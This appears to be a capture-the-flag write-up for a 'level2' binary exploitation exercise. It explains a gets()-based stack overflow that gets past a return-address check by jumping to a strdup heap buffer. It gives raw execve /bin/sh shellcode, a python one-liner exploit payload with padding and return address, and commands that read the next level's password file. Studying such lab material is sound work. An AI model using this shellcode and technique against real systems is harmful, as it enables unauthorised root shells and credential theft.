- attack: buffer overflow with indirect shell call
- binary behavior: reprints argument
- targeted functions: p and main
- vulnerability in main: gets()
- vulnerability in p: strdup()
- defense: no stack overwirting is possible because of comparison of eip address with predefined eip address 

Method:
- find the offset padding size
- overflow the binary
- find the buffer address used by strdup
- overwrite buffer by code calling shell
- overwrite eip by the buffer address
- cat passwd when get console with root privedges

Shell code: 52 http://shell-storm.org/shellcode/files/shellcode-863.html
"\xeb\x25\x5e\x89\xf7\x31\xc0\x50\x89\xe2\x50\x83\xc4\x03\x8d\x76\x04\x33\x06\x50\x31\xc0\x33\x07\x50\x89\xe3\x31\xc0\x50\x8d\x3b\x57\x89\xe1\xb0\x0b\xcd\x80\xe8\xd6\xff\xff\xff\x2f\x2f\x62\x69\x6e\x2f\x73\x68"   

Info:
- 0x0804a008 - buffer address
- 0x08a00480 - same in little-endian
- same in hex - \x08\xa0\x04\x08

- offset of eip register - 80 (from wiremask.eu)
- offset code structure: 80 = 4 (return address) + 52 (shell code) + 28

QA
- How do we know buffer address?
- ltrace() and see address of strdup

Code:
objdump -d ./level2
ltrace ./level2 

gdb level2
(gdb) r <<< Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4
Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A
(python -c 'print "\xeb\x25\x5e\x89\xf7\x31\xc0\x50\x89\xe2\x50\x83\xc4\x03\x8d\x76\x04\x33\x06\x50\x31\xc0\x33\x07\x50\x89\xe3\x31\xc0\x50\x8d\x3b\x57\x89\xe1\xb0\x0b\xcd\x80\xe8\xd6\xff\xff\xff\x2f\x2f\x62\x69\x6e\x2f\x73\x68"  + "a" * 28 + "\x08\xa0\x04\x08"';cat) | ./level2
whoami
cat /home/user/level3/.pass


Functions

main
0804853f <main>:
 804853f:       55                      push   %ebp
 8048540:       89 e5                   mov    %esp,%ebp
 8048542:       83 e4 f0                and    $0xfffffff0,%esp
 8048545:       e8 8a ff ff ff          call   80484d4 <p>      #call function p
 804854a:       c9                      leave
 804854b:       c3                      ret

p

080484d4 <p>:
 80484d4:       55                      push   %ebp
 80484d5:       89 e5                   mov    %esp,%ebp
 80484d7:       83 ec 68                sub    $0x68,%esp   # 104
 80484da:       a1 60 98 04 08          mov    0x8049860,%eax
 80484df:       89 04 24                mov    %eax,(%esp)
 80484e2:       e8 c9 fe ff ff          call   80483b0 <fflush@plt>
 80484e7:       8d 45 b4                lea    -0x4c(%ebp),%eax #76
 80484ea:       89 04 24                mov    %eax,(%esp)
 80484ed:       e8 ce fe ff ff          call   80483c0 <gets@plt>
 80484f2:       8b 45 04                mov    0x4(%ebp),%eax
 80484f5:       89 45 f4                mov    %eax,-0xc(%ebp)
 80484f8:       8b 45 f4                mov    -0xc(%ebp),%eax
 80484fb:       25 00 00 00 b0          and    $0xb0000000,%eax #defence
 8048500:       3d 00 00 00 b0          cmp    $0xb0000000,%eax #defence
 8048505:       75 20                   jne    8048527 <p+0x53>
 8048507:       b8 20 86 04 08          mov    $0x8048620,%eax
 804850c:       8b 55 f4                mov    -0xc(%ebp),%edx
 804850f:       89 54 24 04             mov    %edx,0x4(%esp)
 8048513:       89 04 24                mov    %eax,(%esp)
 8048516:       e8 85 fe ff ff          call   80483a0 <printf@plt>
 804851b:       c7 04 24 01 00 00 00    movl   $0x1,(%esp)
 8048522:       e8 a9 fe ff ff          call   80483d0 <_exit@plt>
 8048527:       8d 45 b4                lea    -0x4c(%ebp),%eax
 804852a:       89 04 24                mov    %eax,(%esp)
 804852d:       e8 be fe ff ff          call   80483f0 <puts@plt>
 8048532:       8d 45 b4                lea    -0x4c(%ebp),%eax
 8048535:       89 04 24                mov    %eax,(%esp)
 8048538:       e8 a3 fe ff ff          call   80483e0 <strdup@plt> #exploit
 804853d:       c9                      leave
 804853e:       c3                      ret



 
             